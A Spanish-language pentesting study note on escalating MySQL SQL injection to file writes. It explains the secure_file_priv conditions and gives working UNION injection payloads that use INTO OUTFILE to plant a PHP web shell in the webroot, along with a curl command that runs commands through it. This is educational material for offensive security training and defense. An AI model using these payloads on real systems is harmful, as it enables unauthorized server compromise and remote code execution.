---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Descripción: "Escribir ficheros es la escalada máxima de una SQL injection: permite dejar una web shell en el webroot y obtener ejecución de comandos en el servidor"
Fecha de actualización: 2026-06-04
Nota previa: "[[07 - Lectura de archivos]]"
Nota siguiente: "[[09 - Mitigación de SQL Injection]]"
Area: "[[SQL Injection.base|SQL Injection]]"
---
---

Escribir ficheros es la escalada máxima de una SQL injection: permite dejar una **web shell** en el webroot y obtener ejecución de comandos en el servidor. Por eso los DBMS modernos lo restringen mucho más que la [[07 - Lectura de archivos|lectura]]. Conviene entender bien las condiciones, porque son precisamente las que explican por qué este vector casi no funciona en stacks actuales.

# Requisitos para escribir

En MySQL hacen falta **tres** condiciones simultáneas:

1. Usuario con privilegio `FILE` (ya confirmado en la nota anterior).
2. La variable global `secure_file_priv` no debe impedirlo.
3. Permiso de escritura del usuario del SO sobre el directorio destino.

## `secure_file_priv`: la barrera moderna

<mark style="background: #ADCCFFA6;">`secure_file_priv` controla desde/hacia qué directorios puede el DBMS leer y escribir</mark>. Sus valores:

| Valor | Efecto |
| ----- | ------ |
| Vacío (`""`) | Lectura/escritura en **todo** el sistema de ficheros. |
| Una ruta (p. ej. `/var/lib/mysql-files`) | Solo dentro de ese directorio. |
| `NULL` | Lectura/escritura **deshabilitada** por completo. |

<mark style="background: #8000E1A6;">Aquí está la clave de por qué la escritura vía SQLi apenas funciona hoy</mark>: MariaDB deja `secure_file_priv` vacío por defecto (permisivo), pero **MySQL (5.7+) usa `/var/lib/mysql-files`** —fuera del webroot, así que no sirve para una web shell— y muchas configuraciones endurecidas lo ponen a `NULL`, bloqueando toda escritura. (MySQL 5.6 y anteriores lo dejaban vacío, como MariaDB.) Se consulta vía `INFORMATION_SCHEMA`:

```sql
-- válido en toda versión:
cn' UNION SELECT 1, @@global.secure_file_priv, 3, 4-- -
-- vía tabla (MariaDB / MySQL 5.7; en MySQL 8 está en performance_schema.global_variables):
-- cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
```

Un valor **vacío** es luz verde para escribir donde queramos.

# `SELECT ... INTO OUTFILE`

`INTO OUTFILE` exporta el resultado de un `SELECT` a un fichero. Se puede volcar una tabla o, más útil, escribir cadenas arbitrarias:

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

El fichero queda propiedad del usuario `mysql`. Vía inyección `UNION`, para escribir una prueba en el webroot:

```sql
cn' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

Si la página no da error, la escritura funcionó. Accediendo a `proof.txt` se ve el contenido, junto con los valores de relleno (`1`, `3`, `4`) del `UNION`.

> [!info]+
> Para escribir contenido limpio (sin los números de relleno) se usan cadenas vacías `""` en vez de números. Para ficheros binarios o muy largos —evitando comillas y caracteres problemáticos— se envuelve el contenido con `FROM_BASE64("...")`.

# Escribir una web shell → RCE

Confirmada la escritura, se deja una [[09 - Introducción a web shells|web shell]] PHP mínima en el webroot:

```php
<?php system($_REQUEST[0]); ?>
```

```sql
cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Después basta navegar a `shell.php` pasando el comando por el parámetro `0`:

```shell-session
$ curl "http://target/shell.php?0=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<mark style="background: #FFB86CA6;">La salida de `id` confirma ejecución de comandos como el usuario `www-data`</mark> —el servidor está comprometido—.

> [!important]+
> Para escribir la web shell hay que conocer el **webroot**. Si no se conoce: leer la configuración del servidor con [[07 - Lectura de archivos|`LOAD_FILE`]] (`/etc/apache2/apache2.conf`, `/etc/nginx/nginx.conf`), provocar un error que revele la ruta, o fuzzear rutas típicas con las wordlists de webroot de SecLists.

> [!warning]+
> En un *engagement* real, una web shell es ruidosa y persistente: <mark style="background: #FF5582A6;">déjala con un nombre no adivinable, restringe su acceso y elimínala al terminar</mark> (OPSEC y limpieza). Mejor aún, para demostrar el RCE sin dejar artefactos, ejecuta un único comando de prueba inocuo. En bug bounty, escribir ficheros suele exceder el alcance permitido: confirma la capacidad sin llegar a la web shell salvo autorización explícita.

> [!warning]+
> **Realidad 2026**: la cadena completa SQLi → web shell → RCE en MySQL es **rara**. Exige cuenta con `FILE`, `secure_file_priv` vacío y un webroot escribible —combinación poco frecuente en sistemas mantenidos—. Donde sigue dándose RCE vía SQLi es en [[01 - Introducción a Blind SQL Injection|MSSQL (`xp_cmdshell`)]] y [[09 - PostgreSQL ejecución de comandos|PostgreSQL (`COPY ... FROM PROGRAM`)]], que se cubren en los módulos avanzados.

Tras ver todo lo que una SQLi permite, el cierre obligado es cómo **prevenirla**: [[09 - Mitigación de SQL Injection]].
